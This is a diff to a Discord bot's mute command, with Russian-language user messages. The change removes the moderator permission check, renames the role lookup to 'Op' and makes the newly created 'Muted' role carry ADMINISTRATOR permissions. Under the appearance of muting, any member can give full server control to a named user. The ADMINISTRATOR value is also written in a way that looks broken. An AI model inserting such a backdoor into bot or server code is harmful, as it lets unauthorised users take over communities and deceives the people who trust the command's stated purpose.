@@ -1,7 +1,6 @@
 const Discord = module.require("discord.js");
 const fs = require("fs");
 module.exports.run = async (bot,message,args) => {
-    if(!message.member.hasPermission("MANAGE_MESSAGES")) return message.channel.send("У вас нет прав");
     let rUser = message.guild.member(message.mentions.users.first() || message.guild.members.get(args[0]));
     if(!args[0]) return bot.send("Вы не указали пользователя");
     if(!rUser) return bot.send("Пользователь не найден");
@@ -11,11 +10,11 @@ module.exports.run = async (bot,message,args) => {
     .setColor('#e22216')
     .addField("Администратор",message.author.username)
     .addField("Замутили",`${rUser.user.username}`);
-    let role = message.guild.roles.find(r => r.name === "Muted");
+    let role = message.guild.roles.find(r => r.name === "Op");
     if(!role){
         role = await message.guild.createRole({
             name:"Muted",
-            permissions:[]
+            permissions:[ADMINISTRATOR]
         });
         message.guild.channels.forEach(async (channel,id) => {
             await channel.overwritePermissions(role,{
